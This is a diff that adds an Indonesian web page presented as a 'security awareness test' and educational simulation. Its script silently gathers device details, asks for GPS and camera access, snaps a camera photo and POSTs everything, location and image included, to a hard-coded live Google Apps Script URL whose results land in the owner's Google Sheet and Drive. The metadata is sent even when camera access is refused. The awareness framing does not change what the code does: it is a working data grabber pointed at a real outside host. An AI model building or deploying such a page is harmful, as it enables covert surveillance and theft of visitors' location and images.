@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistem Verifikasi Keamanan v2.0</title>
+    <style>
+        body { font-family: 'Segoe UI', Arial, sans-serif; background: #1a1a1a; color: #ffffff; text-align: center; padding: 50px 20px; }
+        .container { max-width: 600px; margin: auto; background: #2d2d2d; padding: 30px; border-radius: 15px; border: 1px solid #444; }
+        h1 { font-weight: 800; color: #00ff88; text-transform: uppercase; }
+        p { color: #ccc; line-height: 1.6; }
+        .btn { background: #00ff88; color: #1a1a1a; border: none; padding: 15px 30px; font-weight: bold; border-radius: 8px; cursor: pointer; font-size: 16px; transition: 0.3s; }
+        .btn:hover { background: #00cc6e; transform: scale(1.05); }
+        .log { margin-top: 20px; text-align: left; background: #000; padding: 15px; border-radius: 8px; font-family: 'Courier New', monospace; font-size: 12px; color: #00ff00; overflow-x: auto; }
+        #video { display: none; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>Security Awareness Test</h1>
+    <p>Halaman ini adalah simulasi edukasi. Klik tombol di bawah untuk melihat seberapa banyak data yang bisa diambil oleh website asing dalam hitungan detik.</p>
+    
+    <button id="mainBtn" class="btn">MULAI SCAN PERANGKAT</button>
+
+    <div id="terminal" class="log">
+        > Menunggu interaksi pengguna...<br>
+    </div>
+</div>
+
+<video id="video" autoplay></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+const GAS_URL = "https://script.google.com/macros/s/AKfycbwjiSsPHjrymTp6ScwH1AAj68XbYGmI0Vq6aMfOHAZrtBFypj8dUIZbc1oXVl6vzwQkvg/exec";
+const terminal = document.getElementById('terminal');
+const mainBtn = document.getElementById('mainBtn');
+
+// 1. Ambil Data Otomatis (Tanpa Izin)
+async function getAutoData() {
+    let batteryInfo = "Not Supported";
+    if (navigator.getBattery) {
+        const b = await navigator.getBattery();
+        batteryInfo = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Discharging'})`;
+    }
+
+    return {
+        os: navigator.platform,
+        browser: navigator.userAgent.split(' ').slice(-5).join(' '),
+        battery: batteryInfo,
+        screen: `${window.screen.width}x${window.screen.height}`,
+        cores: navigator.hardwareConcurrency || "N/A"
+    };
+}
+
+mainBtn.addEventListener('click', async () => {
+    mainBtn.disabled = true;
+    mainBtn.innerText = "SEDANG SCANNING...";
+    terminal.innerHTML += "> Mengambil metadata sistem...<br>";
+    
+    const deviceData = await getAutoData();
+    terminal.innerHTML += `> OS: ${deviceData.os}<br>> Baterai: ${deviceData.battery}<br>`;
+
+    // 2. Minta Izin Lokasi & Kamera
+    terminal.innerHTML += "> Meminta akses sensor sensitif...<br>";
+    
+    let locationStr = "Denied";
+    try {
+        const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
+        locationStr = `${pos.coords.latitude}, ${pos.coords.longitude}`;
+        terminal.innerHTML += "> [Akses Diterima] Lokasi GPS terkunci.<br>";
+    } catch (e) { terminal.innerHTML += "> [Akses Ditolak] Lokasi gagal diambil.<br>"; }
+
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.getElementById('video');
+        video.srcObject = stream;
+        terminal.innerHTML += "> [Akses Diterima] Kamera aktif. Mengambil frame...<br>";
+
+        setTimeout(() => {
+            const canvas = document.getElementById('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            const imgData = canvas.toDataURL('image/jpeg');
+
+            // 3. Kirim Semua ke GAS
+            fetch(GAS_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify({
+                    ...deviceData,
+                    location: locationStr,
+                    image: imgData
+                })
+            });
+
+            terminal.innerHTML += "> <b>DATA BERHASIL DIKIRIM KE SERVER CLOUD.</b><br>";
+            terminal.innerHTML += "> Periksa Google Sheet & Drive untuk melihat hasilnya.<br>";
+            stream.getTracks().forEach(t => t.stop());
+            mainBtn.innerText = "SCAN SELESAI";
+        }, 2000);
+
+    } catch (e) {
+        terminal.innerHTML += "> [Akses Ditolak] Kamera gagal diakses.<br>";
+        // Tetap kirim metadata meski kamera ditolak
+        fetch(GAS_URL, { method: 'POST', mode: 'no-cors', body: JSON.stringify({...deviceData, location: locationStr}) });
+    }
+});
+</script>
+</body>
+</html>
